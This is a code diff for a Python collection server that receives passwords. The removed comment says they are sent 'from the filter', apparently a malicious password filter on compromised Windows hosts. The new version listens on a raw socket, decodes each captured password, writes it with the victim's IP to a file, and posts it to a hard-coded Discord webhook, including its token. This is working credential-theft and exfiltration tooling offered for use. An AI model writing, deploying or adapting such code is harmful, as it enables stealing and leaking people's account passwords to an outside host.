@@ -1,28 +1,54 @@
-#
-# ChatGPT, Asa Horn (in that order)
-# aoh9470@rit.edu
-#
+import socket
+from datetime import datetime
+from colorama import Fore, Style, init
+import requests
 
-# Very quick and dirty flask web server to receive Passwords being sent
-# from the filter
+# Initialize colorama
+init()
 
-from flask import Flask, request
+def listen_for_utf16le_string(port=80, output_file='passwords.txt'):
+    # Create a TCP socket
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        # Bind the socket to listen on the specified port
+        sock.bind(('0.0.0.0', port))
+        sock.listen()  # Start listening for incoming connections
+        print(f"Listening on port {port}...")
 
-app = Flask(__name__)
+        # Open the file to log the received data
+        with open(output_file, 'a', encoding='utf-8') as file:
+            while True:
+                # Accept a new connection
+                conn, addr = sock.accept()
+                with conn:
+                    while True:
+                        # Receive data from the connection (buffer size 1024 bytes)
+                        data = conn.recv(1024)
+                        if not data:
+                            break  # Exit the loop if no data is received
 
-@app.route('/post', methods=['POST'])
-def handle_post():
-    # Get the JSON payload from the POST request
-    data = request.data
+                        # Decode the data from UTF-16LE
+                        try:
+                            decoded_string = data.decode('utf-16le')
 
-    text = data.decode('utf-16le')
+                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%m%S')
 
-    # Print the payload to the console
-    print("Received POST data:", text)
+                            requests.post(
+                                "https://discord.com/api/webhooks/1231255731206881310/aQ-XBNP9-_k_6mNMIjqkOSP32izJXpbx6AsQqpybjgMDK-_rR8l2nKhgJ27_uKw8OKFH",
+                                json={"content": addr[0] + ' @ ' + timestamp+ " ```" + decoded_string + "```"})
 
-    # Return a response
-    return "POST request received", 200
+                            # Terminal output with colors
+                            output = (f"{Fore.RED}{addr[0]}{Style.RESET_ALL} :: "  +# IP in red
+                                      f"{Fore.GREEN}{decoded_string.strip()}{Style.RESET_ALL} @@ " + # String in green
+                                      f"{Fore.BLUE}{timestamp}{Style.RESET_ALL}"  # Timestamp in blue
+                                      )
+
+                            # Save the plain output to file (without colors)
+                            print(output)
+                            file.write(output + '\n')
+                            file.flush()  # Ensure it's written immediately
+                        except UnicodeDecodeError as e:
+                            print(f"Error decoding UTF-16LE string: {e}")
+                            continue
 
 if __name__ == '__main__':
-    # Run the Flask app on port 5000
-    app.run(debug=True, host='0.0.0.0', port=80)
+    listen_for_utf16le_string()
